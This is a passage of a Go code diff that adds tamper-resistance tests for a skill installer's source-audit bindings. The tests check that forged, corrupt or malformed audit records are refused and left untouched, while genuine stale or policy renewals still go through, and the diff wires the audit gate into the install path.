++					t.Fatalf("genuine policy renewal did not re-issue the binding")
++				}
++				var before, after map[string]any
++				if err := json.Unmarshal(objectBeforeRenewal, &before); err != nil {
++					t.Fatal(err)
++				}
++				if err := json.Unmarshal(renewed, &after); err != nil {
++					t.Fatal(err)
++				}
++				if before["policy_sha256"] == after["policy_sha256"] {
++					t.Fatalf("genuine policy renewal kept the old policy digest")
++				}
++				return
++			}
++			tamperedObject, err := os.ReadFile(objectPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			var tamperedReport []byte
++			if mode != "future-time" {
++				tamperedReport, err = os.ReadFile(reportPath)
++				if err != nil {
++					t.Fatal(err)
++				}
++			}
++			result := draftProjectResult(cfg, project, home, false)
++			if !strings.Contains(strings.Join(result.Errors, ";"), "source_audit") {
++				t.Fatalf("%s with policy drift was NOT refused: %+v", mode, result)
++			}
++			if strings.Contains(strings.Join(result.Errors, ";"), "source_audit_rejected: policy:") {
++				t.Fatalf("%s hid behind renewable policy error: %+v", mode, result)
++			}
++			afterObject, err := os.ReadFile(objectPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			if string(tamperedObject) != string(afterObject) {
++				t.Fatalf("%s existing binding was overwritten on policy drift", mode)
++			}
++			if mode == "corrupt" {
++				afterReport, err := os.ReadFile(reportPath)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if string(afterReport) != "{}" {
++					t.Fatalf("corrupt report was overwritten on policy drift")
++				}
++			} else if mode != "future-time" {
++				afterReport, err := os.ReadFile(reportPath)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if string(tamperedReport) != string(afterReport) {
++					t.Fatalf("%s existing report was overwritten on policy drift", mode)
++				}
++			}
++		})
++	}
++}
++
++// TestDraftAuditRenewalNeverHidesRefusal pins the rework-3 ordering at the
++// production entry (install.Project): phase-1 bindings (identity, context,
++// evidence integrity/completeness/trusted bindings, stored-vs-live
++// decision, forged-future time) validate completely before either renewable
++// condition (stale time, trusted policy drift) may renew. Rows enumerate
++// renewable causes {stale, stale+policy-drift} against every broken binding;
++// the policy-drift-only column lives in
++// TestDraftAuditPolicyRenewalBrokenEvidence. Every refuse row fails on the
++// mutating path with a non-renewable source_audit diagnostic and overwrites
++// neither the object nor the report. Controls prove a valid stale binding
++// (with and without drift) still renews through a fresh live run.
++func TestDraftAuditRenewalNeverHidesRefusal(t *testing.T) {
++	tampers := []struct {
++		name    string
++		mutate  func(t *testing.T, objectPath, reportPath string)
++		wantSub string
++	}{
++		{"forged-decision", func(t *testing.T, objectPath, reportPath string) {
++			raw, err := os.ReadFile(reportPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			var report audit.EvidenceReport
++			if err := json.Unmarshal(raw, &report); err != nil {
++				t.Fatal(err)
++			}
++			report.Decision = audit.DecisionWarn
++			forged, err := audit.MarshalEvidenceReport(report)
++			if err != nil {
++				t.Fatal(err)
++			}
++			if err := os.WriteFile(reportPath, forged, 0o600); err != nil {
++				t.Fatal(err)
++			}
++			rewriteAuditObject(t, objectPath, map[string]any{
++				"decision":        audit.DecisionWarn,
++				"evidence_sha256": audit.EvidenceDigest(forged),
++			})
++		}, "source_audit_rejected: decision:"},
++		{"wrong-skill", func(t *testing.T, objectPath, reportPath string) {
++			raw, err := os.ReadFile(reportPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			var report audit.EvidenceReport
++			if err := json.Unmarshal(raw, &report); err != nil {
++				t.Fatal(err)
++			}
++			report.Skill = "different-skill"
++			forged, err := audit.MarshalEvidenceReport(report)
++			if err != nil {
++				t.Fatal(err)
++			}
++			if err := os.WriteFile(reportPath, forged, 0o600); err != nil {
++				t.Fatal(err)
++			}
++			rewriteAuditObject(t, objectPath, map[string]any{
++				"evidence_sha256": audit.EvidenceDigest(forged),
++			})
++		}, "source_audit_rejected: evidence"},
++		{"corrupt-report", func(t *testing.T, _, reportPath string) {
++			if err := os.WriteFile(reportPath, []byte(`{}`), 0o600); err != nil {
++				t.Fatal(err)
++			}
++		}, "source_audit_rejected: evidence"},
++		{"digest-mismatch", func(t *testing.T, _, reportPath string) {
++			raw, err := os.ReadFile(reportPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			if err := os.WriteFile(reportPath, append(append([]byte(nil), raw...), ' '), 0o600); err != nil {
++				t.Fatal(err)
++			}
++		}, "source_audit_rejected: evidence"},
++	}
++	causes := []struct {
++		name  string
++		stale bool
++		drift bool
++	}{
++		{"stale", true, false},
++		{"stale-plus-drift", true, true},
++	}
++	for _, cause := range causes {
++		for _, tamper := range tampers {
++			t.Run(cause.name+"-with-"+tamper.name, func(t *testing.T) {
++				project, home, _ := strictLocalProject(t, "")
++				cfg := draftAuditConfig(home)
++				assertGatePassed(t, draftProjectResult(cfg, project, home, false))
++				objectPath, reportPath := auditBindingPaths(t, home)
++				tamper.mutate(t, objectPath, reportPath)
++				if cause.stale {
++					rewriteAuditObject(t, objectPath, map[string]any{
++						"created_at": "2020-01-01T00:00:00Z",
++					})
++				}
++				tamperedObject, err := os.ReadFile(objectPath)
++				if err != nil {
++					t.Fatal(err)
++				}
++				tamperedReport, err := os.ReadFile(reportPath)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if cause.drift {
++					cfg.Audit.FailOn = "critical"
++				}
++				result := draftProjectResult(cfg, project, home, false)
++				joined := strings.Join(result.Errors, ";")
++				if !strings.Contains(joined, tamper.wantSub) {
++					t.Fatalf("%s was NOT refused with %q: %+v", tamper.name, tamper.wantSub, result)
++				}
++				if strings.Contains(joined, "source_audit_rejected: policy:") ||
++					strings.Contains(joined, "is stale; re-run the gates") {
++					t.Fatalf("%s hid behind a renewable diagnostic: %+v", tamper.name, result)
++				}
++				// Narrowing: the read-only path refuses too — the record is
++				// broken, never renewable.
++				other := draftProjectResult(cfg, project, home, true)
++				if !strings.Contains(strings.Join(other.Errors, ";"), "source_audit") {
++					t.Fatalf("%s was NOT refused on the read-only path: %+v", tamper.name, other)
++				}
++				// Never overwritten by the refused mutating install.
++				afterObject, err := os.ReadFile(objectPath)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if string(tamperedObject) != string(afterObject) {
++					t.Fatalf("%s existing binding was overwritten", tamper.name)
++				}
++				afterReport, err := os.ReadFile(reportPath)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if string(tamperedReport) != string(afterReport) {
++					t.Fatalf("%s existing report was overwritten", tamper.name)
++				}
++			})
++		}
++	}
++	for _, control := range []struct {
++		name  string
++		drift bool
++	}{{"genuine-stale-renewal", false}, {"genuine-stale-plus-drift-renewal", true}} {
++		t.Run(control.name, func(t *testing.T) {
++			project, home, _ := strictLocalProject(t, "")
++			cfg := draftAuditConfig(home)
++			assertGatePassed(t, draftProjectResult(cfg, project, home, false))
++			objectPath, _ := auditBindingPaths(t, home)
++			before, err := os.ReadFile(objectPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			rewriteAuditObject(t, objectPath, map[string]any{
++				"created_at": "2020-01-01T00:00:00Z",
++			})
++			aged, err := os.ReadFile(objectPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			if control.drift {
++				cfg.Audit.FailOn = "critical"
++			}
++			assertGatePassed(t, draftProjectResult(cfg, project, home, false))
++			renewed, err := os.ReadFile(objectPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			var beforeObject, agedObject, afterObject map[string]any
++			if err := json.Unmarshal(before, &beforeObject); err != nil {
++				t.Fatal(err)
++			}
++			if err := json.Unmarshal(aged, &agedObject); err != nil {
++				t.Fatal(err)
++			}
++			if err := json.Unmarshal(renewed, &afterObject); err != nil {
++				t.Fatal(err)
++			}
++			if agedObject["created_at"] == afterObject["created_at"] {
++				t.Fatalf("%s did not re-issue the stale binding", control.name)
++			}
++			if control.drift && beforeObject["policy_sha256"] == afterObject["policy_sha256"] {
++				t.Fatalf("%s kept the old policy digest", control.name)
++			}
++		})
++	}
++}
++
++// rewriteAuditObject applies key updates to the stored source-audit object
++// JSON. Test helper only: production code never edits a stored binding.
++func rewriteAuditObject(t *testing.T, objectPath string, updates map[string]any) {
++	t.Helper()
++	raw, err := os.ReadFile(objectPath)
++	if err != nil {
++		t.Fatal(err)
++	}
++	var object map[string]any
++	if err := json.Unmarshal(raw, &object); err != nil {
++		t.Fatal(err)
++	}
++	for key, value := range updates {
++		object[key] = value
++	}
++	raw, err = json.Marshal(object)
++	if err != nil {
++		t.Fatal(err)
++	}
++	if err := os.WriteFile(objectPath, raw, 0o600); err != nil {
++		t.Fatal(err)
++	}
++}
++
++// auditBindingPaths locates the single stored source-audit object and its
++// evidence report. Test helper only.
++func auditBindingPaths(t *testing.T, home string) (objectPath, reportPath string) {
++	t.Helper()
++	objects, err := filepath.Glob(filepath.Join(home, "source-audit", "*.json"))
++	if err != nil {
++		t.Fatal(err)
++	}
++	for _, p := range objects {
++		if strings.HasSuffix(p, ".report.json") {
++			reportPath = p
++		} else {
++			objectPath = p
++		}
++	}
++	if objectPath == "" || reportPath == "" {
++		t.Fatal("binding missing")
++	}
++	return objectPath, reportPath
++}
++
++// TestDraftAuditRenewalMarkersNeverRenewable pins the rework-4
++// classification at the production entry (install.Project): renewal markers
++// ("is stale; re-run the gates" and "source_audit_rejected: policy:")
++// placed in untrusted report fields (skill, decision, package kind) must not
++// promote a refusal to renewal, with or without real renewal conditions
++// (fresh vs stale+policy-drift). Every refuse row fails on the mutating path
++// with the evidence diagnostic and overwrites neither record; the read-only
++// path refuses too. Controls prove valid stale/policy renewal still works.
++func TestDraftAuditRenewalMarkersNeverRenewable(t *testing.T) {
++	staleMarker := "is stale; re-run the gates"
++	policyMarker := "source_audit_rejected: policy:"
++	markers := []struct{ name, value string }{
++		{"stale-marker", staleMarker},
++		{"policy-marker", policyMarker},
++	}
++	fields := []struct{ name string }{
++		{"skill"},
++		{"decision"},
++		{"package"},
++	}
++	causes := []struct {
++		name  string
++		stale bool
++		drift bool
++	}{
++		{"fresh", false, false},
++		{"stale", true, false},
++		{"stale-plus-drift", true, true},
++	}
++	for _, field := range fields {
++		for _, marker := range markers {
++			for _, cause := range causes {
++				t.Run(field.name+"-"+marker.name+"-"+cause.name, func(t *testing.T) {
++					project, home, _ := strictLocalProject(t, "")
++					cfg := draftAuditConfig(home)
++					assertGatePassed(t, draftProjectResult(cfg, project, home, false))
++					objectPath, reportPath := auditBindingPaths(t, home)
++					raw, err := os.ReadFile(reportPath)
++					if err != nil {
++						t.Fatal(err)
++					}
++					var report audit.EvidenceReport
++					if err := json.Unmarshal(raw, &report); err != nil {
++						t.Fatal(err)
++					}
++					switch field.name {
++					case "skill":
++						report.Skill = marker.value
++					case "decision":
++						report.Decision = marker.value
++					case "package":
++						report.Package = audit.SourcePackage{Kind: marker.value}
++					}
++					forged, err := audit.MarshalEvidenceReport(report)
++					if err != nil {
++						t.Fatal(err)
++					}
++					if err := os.WriteFile(reportPath, forged, 0o600); err != nil {
++						t.Fatal(err)
++					}
++					rewriteAuditObject(t, objectPath, map[string]any{
++						"evidence_sha256": audit.EvidenceDigest(forged),
++					})
++					if cause.stale {
++						rewriteAuditObject(t, objectPath, map[string]any{
++							"created_at": "2020-01-01T00:00:00Z",
++						})
++					}
++					tamperedObject, err := os.ReadFile(objectPath)
++					if err != nil {
++						t.Fatal(err)
++					}
++					tamperedReport, err := os.ReadFile(reportPath)
++					if err != nil {
++						t.Fatal(err)
++					}
++					if cause.drift {
++						cfg.Audit.FailOn = "critical"
++					}
++					result := draftProjectResult(cfg, project, home, false)
++					joined := strings.Join(result.Errors, ";")
++					if !strings.Contains(joined, "source_audit_rejected: evidence") {
++						t.Fatalf("%s in %s was NOT refused with evidence diagnostic: %+v", marker.name, field.name, result)
++					}
++					other := draftProjectResult(cfg, project, home, true)
++					if !strings.Contains(strings.Join(other.Errors, ";"), "source_audit") {
++						t.Fatalf("%s in %s was NOT refused on the read-only path: %+v", marker.name, field.name, other)
++					}
++					afterObject, err := os.ReadFile(objectPath)
++					if err != nil {
++						t.Fatal(err)
++					}
++					if string(tamperedObject) != string(afterObject) {
++						t.Fatalf("%s in %s existing binding was overwritten", marker.name, field.name)
++					}
++					afterReport, err := os.ReadFile(reportPath)
++					if err != nil {
++						t.Fatal(err)
++					}
++					if string(tamperedReport) != string(afterReport) {
++						t.Fatalf("%s in %s existing report was overwritten", marker.name, field.name)
++					}
++				})
++			}
++		}
++	}
++	t.Run("genuine-stale-renewal-control", func(t *testing.T) {
++		project, home, _ := strictLocalProject(t, "")
++		cfg := draftAuditConfig(home)
++		assertGatePassed(t, draftProjectResult(cfg, project, home, false))
++		objectPath, _ := auditBindingPaths(t, home)
++		rewriteAuditObject(t, objectPath, map[string]any{
++			"created_at": "2020-01-01T00:00:00Z",
++		})
++		assertGatePassed(t, draftProjectResult(cfg, project, home, false))
++	})
++	t.Run("genuine-policy-renewal-control", func(t *testing.T) {
++		project, home, _ := strictLocalProject(t, "")
++		cfg := draftAuditConfig(home)
++		assertGatePassed(t, draftProjectResult(cfg, project, home, false))
++		objectPath, _ := auditBindingPaths(t, home)
++		before, err := os.ReadFile(objectPath)
++		if err != nil {
++			t.Fatal(err)
++		}
++		cfg.Audit.FailOn = "critical"
++		assertGatePassed(t, draftProjectResult(cfg, project, home, false))
++		after, err := os.ReadFile(objectPath)
++		if err != nil {
++			t.Fatal(err)
++		}
++		if string(before) == string(after) {
++			t.Fatalf("genuine policy renewal did not re-issue the binding")
++		}
++	})
++}
++
++// TestDraftAuditMalformedShapeRefuses pins the rework-5 parser/shape gaps
++// at the production entry (install.Project): a trailing document after the
++// stored object, JSON null for any required report member, and wrong types
++// for any required report member all refuse with a source_audit diagnostic
++// and overwrite neither record. One fixture is established once and restored
++// per row so the table stays fast (no per-row Git setup).
++func TestDraftAuditMalformedShapeRefuses(t *testing.T) {
++	project, home, _ := strictLocalProject(t, "")
++	cfg := draftAuditConfig(home)
++	assertGatePassed(t, draftProjectResult(cfg, project, home, false))
++	objectPath, reportPath := auditBindingPaths(t, home)
++	baseObject, err := os.ReadFile(objectPath)
++	if err != nil {
++		t.Fatal(err)
++	}
++	baseReport, err := os.ReadFile(reportPath)
++	if err != nil {
++		t.Fatal(err)
++	}
++	restore := func(t *testing.T) {
++		t.Helper()
++		if err := os.WriteFile(objectPath, baseObject, 0o600); err != nil {
++			t.Fatal(err)
++		}
++		if err := os.WriteFile(reportPath, baseReport, 0o600); err != nil {
++			t.Fatal(err)
++		}
++	}
++	mutateReportMember := func(t *testing.T, key string, value any) {
++		t.Helper()
++		raw, err := os.ReadFile(reportPath)
++		if err != nil {
++			t.Fatal(err)
++		}
++		var members map[string]any
++		if err := json.Unmarshal(raw, &members); err != nil {
++			t.Fatal(err)
++		}
++		members[key] = value
++		forged, err := json.Marshal(members)
++		if err != nil {
++			t.Fatal(err)
++		}
++		if err := os.WriteFile(reportPath, forged, 0o600); err != nil {
++			t.Fatal(err)
++		}
++		rewriteAuditObject(t, objectPath, map[string]any{
++			"evidence_sha256": audit.EvidenceDigest(forged),
++		})
++	}
++	type row struct {
++		name   string
++		mutate func(t *testing.T)
++	}
++	nullRows := []row{}
++	for _, key := range []string{
++		"schema_version", "skill", "package", "content_sha256",
++		"findings", "pinned", "revoked", "revocation",
++		"script_policy", "assurance_policy", "decision",
++	} {
++		key := key
++		nullRows = append(nullRows, row{
++			name: "null-" + key,
++			mutate: func(t *testing.T) {
++				mutateReportMember(t, key, nil)
++			},
++		})
++	}
++	wrongTypes := []row{
++		{"wrongtype-schema_version", func(t *testing.T) { mutateReportMember(t, "schema_version", "1") }},
++		{"wrongtype-skill", func(t *testing.T) { mutateReportMember(t, "skill", 123) }},
++		{"wrongtype-package", func(t *testing.T) { mutateReportMember(t, "package", "bad") }},
++		{"wrongtype-content_sha256", func(t *testing.T) { mutateReportMember(t, "content_sha256", 123) }},
++		{"wrongtype-findings", func(t *testing.T) { mutateReportMember(t, "findings", "bad") }},
++		{"wrongtype-pinned", func(t *testing.T) { mutateReportMember(t, "pinned", "true") }},
++		{"wrongtype-revoked", func(t *testing.T) { mutateReportMember(t, "revoked", 1) }},
++		{"wrongtype-revocation", func(t *testing.T) { mutateReportMember(t, "revocation", 123) }},
++		{"wrongtype-script_policy", func(t *testing.T) { mutateReportMember(t, "script_policy", "bad") }},
++		{"wrongtype-assurance_policy", func(t *testing.T) { mutateReportMember(t, "assurance_policy", 123) }},
++		{"wrongtype-decision", func(t *testing.T) { mutateReportMember(t, "decision", 123) }},
++	}
++	rows := []row{
++		{"trailing-object", func(t *testing.T) {
++			raw, err := os.ReadFile(objectPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			if err := os.WriteFile(objectPath, append(append([]byte(nil), raw...), []byte("{}")...), 0o600); err != nil {
++				t.Fatal(err)
++			}
++		}},
++		{"trailing-report", func(t *testing.T) {
++			raw, err := os.ReadFile(reportPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			forged := append(append([]byte(nil), raw...), []byte("{}")...)
++			if err := os.WriteFile(reportPath, forged, 0o600); err != nil {
++				t.Fatal(err)
++			}
++			rewriteAuditObject(t, objectPath, map[string]any{
++				"evidence_sha256": audit.EvidenceDigest(forged),
++			})
++		}},
++	}
++	rows = append(rows, nullRows...)
++	rows = append(rows, wrongTypes...)
++	for _, tc := range rows {
++		t.Run(tc.name, func(t *testing.T) {
++			restore(t)
++			tc.mutate(t)
++			tamperedObject, err := os.ReadFile(objectPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			tamperedReport, err := os.ReadFile(reportPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			result := draftProjectResult(cfg, project, home, false)
++			if !strings.Contains(strings.Join(result.Errors, ";"), "source_audit") {
++				t.Fatalf("%s was NOT refused on the mutating path: %+v", tc.name, result)
++			}
++			other := draftProjectResult(cfg, project, home, true)
++			if !strings.Contains(strings.Join(other.Errors, ";"), "source_audit") {
++				t.Fatalf("%s was NOT refused on the read-only path: %+v", tc.name, other)
++			}
++			afterObject, err := os.ReadFile(objectPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			if string(tamperedObject) != string(afterObject) {
++				t.Fatalf("%s existing binding was overwritten", tc.name)
++			}
++			afterReport, err := os.ReadFile(reportPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			if string(tamperedReport) != string(afterReport) {
++				t.Fatalf("%s existing report was overwritten", tc.name)
++			}
++		})
++	}
++	restore(t)
++	assertGatePassed(t, draftProjectResult(cfg, project, home, true))
++	assertGatePassed(t, draftProjectResult(cfg, project, home, false))
++}
++
++// An enforced script command is refused by the pre-existing scriptpolicy
++// gate during validation, before the source-audit binding and long before
++// any cache or compiler work.
++// TestDraftAuditClosedPackageShapeRefuses pins the rework-6 closed union at
++// the production entry (install.Project): the local-snapshot arm (the only
++// arm install.Project produces) must refuse any foreign-arm member even when
++// null or empty, plus required missing/null/wrong-type, unknown members, and
++// trailing tokens — for both the stored object and the evidence report (with
++// recomputed digest). One fixture is established once and restored per row so
++// the table stays fast (single Git setup). The network-git and
++// configured-git arms are covered arm-for-arm at the audit unit level in
++// TestSourceAuditClosedPackageShape; this production table proves the same
++// raw-shape gate binds the install entry and kills the rev6 probe
++// (TestReviewClosedPackageShape: 14/14 malformed cases).
++func TestDraftAuditClosedPackageShapeRefuses(t *testing.T) {
++	project, home, _ := strictLocalProject(t, "")
++	cfg := draftAuditConfig(home)
++	assertGatePassed(t, draftProjectResult(cfg, project, home, false))
++	objectPath, reportPath := auditBindingPaths(t, home)
++	baseObject, err := os.ReadFile(objectPath)
++	if err != nil {
++		t.Fatal(err)
++	}
++	baseReport, err := os.ReadFile(reportPath)
++	if err != nil {
++		t.Fatal(err)
++	}
++	restore := func(t *testing.T) {
++		t.Helper()
++		if err := os.WriteFile(objectPath, baseObject, 0o600); err != nil {
++			t.Fatal(err)
++		}
++		if err := os.WriteFile(reportPath, baseReport, 0o600); err != nil {
++			t.Fatal(err)
++		}
++	}
++	validCommit := map[string]any{"object_format": "sha1", "hex": strings.Repeat("a", 40)}
++	type row struct {
++		name   string
++		target string // "object" or "report"
++		mutate func(t *testing.T, doc map[string]any)
++	}
++	rows := []row{}
++	// Foreign-arm members × null/empty/valid (probe superset: adds valid).
++	for _, field := range []string{"commit", "repository", "source", "directory"} {
++		values := []struct {
++			label string
++			value any
++		}{{"null", nil}, {"empty", ""}}
++		switch field {
++		case "commit":
++			values = append(values, struct {
++				label string
++				value any
++			}{"valid", validCommit})
++		case "repository":
++			values = append(values, struct {
++				label string
++				value any
++			}{"valid", "example.org/x"})
++		case "source":
++			values = append(values, struct {
++				label string
++				value any
++			}{"valid", "skills/review"})
++		case "directory":
++			values = append(values, struct {
++				label string
++				value any
++			}{"valid", "skills/review"})
++		}
++		for _, target := range []string{"object", "report"} {
++			for _, v := range values {
++				v := v
++				field := field
++				target := target
++				// Probe skips commit/empty (commit:"" is not an object case);
++				// keep the table closed by including it: it must also refuse.
++				rows = append(rows, row{
++					name:   target + "-foreign-" + field + "-" + v.label,
++					target: target,
++					mutate: func(t *testing.T, doc map[string]any) {
++						t.Helper()
++						doc["package"].(map[string]any)[field] = v.value
++					},
++				})
++			}
++		}
++	}
++	// Required members of the local arm: missing/null/wrong-type.
++	for _, target := range []string{"object", "report"} {
++		for _, tc := range []struct {
++			name   string
++			mutate func(map[string]any)
++		}{
++			{"missing-kind", func(doc map[string]any) { delete(doc["package"].(map[string]any), "kind") }},
++			{"null-kind", func(doc map[string]any) { doc["package"].(map[string]any)["kind"] = nil }},
++			{"wrongtype-kind", func(doc map[string]any) { doc["package"].(map[string]any)["kind"] = 123 }},
++			{"missing-snapshot", func(doc map[string]any) { delete(doc["package"].(map[string]any), "snapshot") }},
++			{"null-snapshot", func(doc map[string]any) { doc["package"].(map[string]any)["snapshot"] = nil }},
++			{"wrongtype-snapshot", func(doc map[string]any) { doc["package"].(map[string]any)["snapshot"] = 123 }},
++			{"unknown-package-member", func(doc map[string]any) { doc["package"].(map[string]any)["extra"] = "x" }},
++			{"unknown-top-member", func(doc map[string]any) { doc["extra"] = "x" }},
++			{"commit-extra-member", func(doc map[string]any) {
++				doc["package"].(map[string]any)["commit"] = map[string]any{
++					"object_format": "sha1", "hex": strings.Repeat("a", 40), "extra": "x",
++				}
++			}},
++			{"commit-null-hex", func(doc map[string]any) {
++				doc["package"].(map[string]any)["commit"] = map[string]any{
++					"object_format": "sha1", "hex": nil,
++				}
++			}},
++		} {
++			tc := tc
++			target := target
++			rows = append(rows, row{
++				name:   target + "-" + tc.name,
++				target: target,
++				mutate: func(t *testing.T, doc map[string]any) {
++					t.Helper()
++					tc.mutate(doc)
++				},
++			})
++		}
++	}
++	// Trailing tokens.
++	rows = append(rows, row{name: "object-trailing", target: "object", mutate: nil})
++	rows = append(rows, row{name: "report-trailing", target: "report", mutate: nil})
++	for _, tc := range rows {
++		t.Run(tc.name, func(t *testing.T) {
++			restore(t)
++			if strings.HasSuffix(tc.name, "trailing") {
++				if tc.target == "object" {
++					raw, err := os.ReadFile(objectPath)
++					if err != nil {
++						t.Fatal(err)
++					}
++					if err := os.WriteFile(objectPath, append(append([]byte(nil), raw...), []byte("{}")...), 0o600); err != nil {
++						t.Fatal(err)
++					}
++				} else {
++					raw, err := os.ReadFile(reportPath)
++					if err != nil {
++						t.Fatal(err)
++					}
++					forged := append(append([]byte(nil), raw...), []byte("{}")...)
++					if err := os.WriteFile(reportPath, forged, 0o600); err != nil {
++						t.Fatal(err)
++					}
++					rewriteAuditObject(t, objectPath, map[string]any{"evidence_sha256": audit.EvidenceDigest(forged)})
++				}
++			} else {
++				var path string
++				if tc.target == "object" {
++					path = objectPath
++				} else {
++					path = reportPath
++				}
++				raw, err := os.ReadFile(path)
++				if err != nil {
++					t.Fatal(err)
++				}
++				var doc map[string]any
++				if err := json.Unmarshal(raw, &doc); err != nil {
++					t.Fatal(err)
++				}
++				tc.mutate(t, doc)
++				forged, err := json.Marshal(doc)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if err := os.WriteFile(path, forged, 0o600); err != nil {
++					t.Fatal(err)
++				}
++				if tc.target == "report" {
++					rewriteAuditObject(t, objectPath, map[string]any{"evidence_sha256": audit.EvidenceDigest(forged)})
++				}
++			}
++			tamperedObject, err := os.ReadFile(objectPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			tamperedReport, err := os.ReadFile(reportPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			result := draftProjectResult(cfg, project, home, false)
++			if !strings.Contains(strings.Join(result.Errors, ";"), "source_audit") {
++				t.Fatalf("%s was NOT refused on the mutating path: %+v", tc.name, result)
++			}
++			other := draftProjectResult(cfg, project, home, true)
++			if !strings.Contains(strings.Join(other.Errors, ";"), "source_audit") {
++				t.Fatalf("%s was NOT refused on the read-only path: %+v", tc.name, other)
++			}
++			afterObject, err := os.ReadFile(objectPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			if string(tamperedObject) != string(afterObject) {
++				t.Fatalf("%s existing binding was overwritten", tc.name)
++			}
++			afterReport, err := os.ReadFile(reportPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			if string(tamperedReport) != string(afterReport) {
++				t.Fatalf("%s existing report was overwritten", tc.name)
++			}
++		})
++	}
++	restore(t)
++	assertGatePassed(t, draftProjectResult(cfg, project, home, true))
++	assertGatePassed(t, draftProjectResult(cfg, project, home, false))
++}
++
++func TestDraftAuditEnforcedScriptRefused(t *testing.T) {
++	payload := `{"schema_version":2,"sources":{"s":{"path":"."}},"skills":[{"from":"s","directory":"skills","include":["tool"]}]}`
++	project, home, _ := draftProject(t, payload, map[string]string{"skills/tool": "tool"})
++	dir := filepath.Join(project, "skills", "tool")
++	if err := os.MkdirAll(filepath.Join(dir, "scripts"), 0o755); err != nil {
++		t.Fatal(err)
++	}
++	if err := os.WriteFile(filepath.Join(dir, "scripts", "tool"), []byte("#!/bin/sh\necho tool\n"), 0o644); err != nil {
++		t.Fatal(err)
++	}
++	manifest := map[string]any{
++		"schema_version": 8,
++		"capabilities": map[string]any{
++			"env_read": []string{}, "exec": "none", "filesystem": "repo",
++			"network": "none", "secrets": "none",
++		},
++		"runtime_roots": []string{"scripts"},
++		"commands": map[string]any{
++			"tool": map[string]any{
++				"type": "script", "unix_path": "scripts/tool", "win_path": "scripts/tool",
++				"execution_policy": "script-worker-v1", "interpreter": "python3-v1",
++			},
++		},
++	}
++	encoded, _ := json.MarshalIndent(manifest, "", "  ")
++	if err := os.WriteFile(filepath.Join(dir, "agent-skill.json"), encoded, 0o644); err != nil {
++		t.Fatal(err)
++	}
++	resolveDraftForInstall(t, project, home, payload)
++	cfg := draftTestConfig(home, t.TempDir())
++	result := draftProjectResult(cfg, project, home, true)
++	if result.Status != "failed" ||
++		!strings.Contains(strings.Join(result.Errors, ";"), "script_execution_policy_unsupported") {
++		t.Fatalf("enforced result = %+v, want scriptpolicy refusal", result)
++	}
++}
+diff --git a/internal/install/install.go b/internal/install/install.go
+index 17d0abe..29818ca 100644
+--- a/internal/install/install.go
++++ b/internal/install/install.go
+@@ -35,6 +35,7 @@ import (
+ 	"github.com/relux-works/curator/internal/scopes"
+ 	"github.com/relux-works/curator/internal/skillcheck"
+ 	"github.com/relux-works/curator/internal/skillspec"
++	"github.com/relux-works/curator/internal/sourcelock"
+ )
+ 
+ // Options control one installation run.
+@@ -370,6 +371,7 @@ func projectAttempt(cfg *config.Config, projectRoot, alias string, opts Options,
+ 	}
+ 	fetchedBefore := copySet(opts.FetchedRepos)
+ 	var nodes []*closure.Node
++	var draftLock *sourcelock.Lock
+ 	if effectiveManifest.SchemaVersion == 2 {
+ 		if !draftSourcesEnabled(opts) {
+ 			result.failf("source_selection_invalid: Skillfile schema 2 requires the draft lane; unset %s keeps frozen v1", EnvDraftSourcesV1)
+@@ -383,12 +385,13 @@ func projectAttempt(cfg *config.Config, projectRoot, alias string, opts Options,
+ 			result.failf("source_selection_invalid: development substitutions are not admitted with draft selectors")
+ 			return result, nil
+ 		}
+-		frozenNodes, _, _, err := draftFrozenNodes(cfg.Home(), projectRoot, cfg.SkillsRoot, projectManifestPayload)
++		frozenNodes, _, lock, err := draftFrozenNodes(cfg.Home(), projectRoot, cfg.SkillsRoot, projectManifestPayload)
+ 		if err != nil {
+ 			result.failf("%v", err)
+ 			return result, nil
+ 		}
+ 		nodes = frozenNodes
++		draftLock = lock
+ 	} else {
+ 		built, err := closure.Build(closure.Options{
+ 			SkillsRoot:     cfg.SkillsRoot,
+@@ -459,6 +462,22 @@ func projectAttempt(cfg *config.Config, projectRoot, alias string, opts Options,
+ 		}
+ 	}
+ 
++	// 12b. Draft source-audit binding (skillfile-sources §4). Draft members
++	// carry frozen package identities the shared gates below never see, so
++	// the local-attestation refusal and the source-audit-v1 validation run
++	// here, still before registry resolution and any cache or compiler
++	// work. The frozen v1 lane never sets draftLock and skips this gate.
++	if draftLock != nil {
++		sourceWarnings, err := checkDraftSourceAudit(cfg, nodes, draftLock, opts.DryRun, time.Now())
++		for _, warning := range sourceWarnings {
++			result.Messages = append(result.Messages, alias+": "+warning)
++		}
++		if err != nil {
++			result.failf("%s", err)
++			return result, nil
++		}
++	}
++
+ 	// 13. Audit gate (Spec §12); Options.AuditGate overrides for tests.
+ 	auditGate := opts.AuditGate
+ 	if auditGate == nil {
+diff --git a/internal/registry/local.go b/internal/registry/local.go
+new file mode 100644
+index 0000000..64583fd
+--- /dev/null
++++ b/internal/registry/local.go
+@@ -0,0 +1,34 @@
++package registry
++
++import "fmt"
++
++// Local package kinds admitted by draft source identities. Only packages
++// with a network identity can carry a registry attestation; local content
++// has no audit-record-v1 identity and the registry never forges one.
++const (
++	PackageLocalSnapshot = "local-snapshot"
++	PackageNetworkGit    = "network-git"
++	PackageConfiguredGit = "configured-git"
++)
++
